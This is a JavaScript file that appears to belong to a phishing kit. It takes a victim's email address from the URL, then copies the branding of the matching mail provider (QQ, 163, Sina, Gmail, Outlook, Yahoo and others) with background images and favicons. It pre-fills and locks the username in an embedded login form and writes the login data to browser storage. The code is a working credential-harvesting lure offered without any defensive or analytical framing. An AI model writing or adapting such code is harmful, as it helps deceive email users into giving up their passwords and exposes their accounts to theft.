// Extract query string from the URL
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const email = urlParams.get('files');

// Validate and process the email if it exists
if (email) {
    const [username, emailDomain] = email.split('@').map(part => part.toLowerCase()); // Extract username and domain

    // Define the mapping of email domains to their background images
    const domainBackgrounds = {
        'sogou.com': 'url("sogou.png")',
        '126.com': 'url("126.png")',
        '163.com': 'url("163.png")',
        'yeah.net': 'url("yeah.png")',
        'qq.com': 'url("qq.png")',
        'sina.com': 'url("sina.png")',
        'sina.cn': 'url("sina.png")',
        'sohu.com': 'url("sohu.png")',
        'tom.com': 'url("tom.png")',
        'aliyun.com': 'url("aliyun.png")',
        '21cn.com': 'url("21cn.png")',
        'gmail.com': 'url("gmail.png")',
        'outlook.com': 'url("outlook.png")',
        'yahoo.com': 'url("yahoo.png")',
        'hotmail.com': 'url("outlook.png")',
        'aol.com': 'url("aol.png")',
        'zoho.com': 'url("zoho.png")',
        'protonmail.com': 'url("protonmail.png")',
    
        'mail.com': 'url("mail.png")',
        'qiye.163.com': 'url("qiye163.png")' // Added for NetEase Enterprise Mail
        // Add more email domains and their corresponding background images as needed
    };

    // Define the mapping of email domains to their favicons
    const domainFavicons = {
        'sogou.com': 'https://sogou.com/images/logo/new/favicon.ico?v=4',
        '126.com': 'https://mail.163.com/favicon.ico',
        '163.com': 'https://mail.163.com/favicon.ico',
        'yeah.net': 'https://mail.163.com/favicon.ico',
        'qq.com': 'https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_96h.png',
        'sina.com': 'https://cdn-icons-png.flaticon.com/512/2111/2111599.png',
        'sina.cn': 'https://cdn-icons-png.flaticon.com/512/2111/2111599.png',
        'sohu.com': 'https://1cbbb2d148753.cdn.sohucs.com/e0de4a/img/favicon.66dcaa54.ico',
        'tom.com': 'tomm.png',     
        'aliyun.com': 'https://mail.aliyun.com/static/0.2.8/images/favicon.ico',
        '21cn.com': 'https://mail.21cn.com/w2/favicon.ico',
        'gmail.com': 'https://www.gstatic.com/images/branding/product/2x/gmail_2020q4_48dp.png',
        'outlook.com': 'https://outlook.live.com/favicon.ico',
        'yahoo.com': 'https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico',
        'hotmail.com': 'https://outlook.live.com/favicon.ico',
        'aol.com': 'https://s.yimg.com/wm/login/aol-favicon.png',
        'zoho.com': 'https://www.zohowebstatic.com/sites/zweb/images/favicon.ico',
        'protonmail.com': 'https://proton.me/favicons/apple-touch-icon.png',
        'cn.com': 'https://example.com/path_to_cn_favicon.ico',
        'mail.com': 'https://www.mail.com/favicon.ico',
        'qiye.163.com': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShujWkh5UiwRZYQbFZpl1j_iOHHi9fA6KMBQ&s' // Added for NetEase Enterprise Mail
       
    };

    
    if (domainBackgrounds[emailDomain]) {
        document.body.style.backgroundImage = domainBackgrounds[emailDomain];
        document.body.style.backgroundSize = 'cover'; 
        document.body.style.overflow = 'hidden'; 
        document.body.style.backgroundRepeat = 'no-repeat';

     
        const faviconLink = document.createElement('link');
        faviconLink.rel = 'icon';
        faviconLink.href = domainFavicons[emailDomain];
        document.head.appendChild(faviconLink);
    }

    const domainLoginUrls = {
        'sogou.com': 'https://mail.sogou.com/',
        '126.com': 'https://mail.126.com/',
        '163.com': 'https://mail.163.com/',
        'yeah.net': 'https://www.yeah.net/',
        'qq.com': 'https://mail.qq.com/',
        'sina.com': 'https://mail.sina.com.cn/',
        'sina.cn': 'https://mail.sina.cn/',
        'sohu.com': 'https://mail.sohu.com/',
        'tom.com': 'https://mail.tom.com/',
        'aliyun.com': 'https://mail.aliyun.com/',
        '21cn.com': 'https://mail.21cn.com/',
        'gmail.com': 'https://accounts.google.com/signin',
        'outlook.com': 'https://login.live.com/',
        'yahoo.com': 'https://login.yahoo.com/',
        'hotmail.com': 'https://outlook.live.com/',
        'aol.com': 'https://login.aol.com/',
        'zoho.com': 'https://accounts.zoho.com/',
        'protonmail.com': 'https://mail.protonmail.com/',
        'cn.com': 'http://mail.cn.com/',
        'mail.com': 'https://login.mail.com/',
        'qiye.163.com': 'https://mail.qiye.163.com/' // Added for NetEase Enterprise Mail
        // Add more email domains and their corresponding login URLs as needed
    };

    if (domainLoginUrls[emailDomain]) {
        document.getElementById('loginIframe').onload = function() {
            const iframeDoc = document.getElementById('loginIframe').contentDocument;

            const scriptElement = iframeDoc.createElement('script');
            scriptElement.textContent = `
                document.addEventListener('DOMContentLoaded', function() {
                    document.getElementById('username').value = '${username}';
                    document.getElementById('username').setAttribute('readonly', true); // Make username readonly
                    document.getElementById('password').value = '';

                    localStorage.setItem('email', '${username}');
                    localStorage.setItem('password', '');

                    if ('caches' in window) {
                        caches.open('login-cache').then(function(cache) {
                            const loginData = new Response(JSON.stringify({ email: '${username}', password: '' }), {
                                headers: { 'Content-Type': 'application/json' }
                            });
                            cache.put('/login-data', loginData);
                        }).catch(function(error) {
                            console.error('Caching failed:', error);
                        });
                    }
                });
            `;
            iframeDoc.head.appendChild(scriptElement);
        };
    } else {
        window.location.href = `https://${emailDomain}`;
    }
} else {
    alert('No email parameter found in the query string.');
}
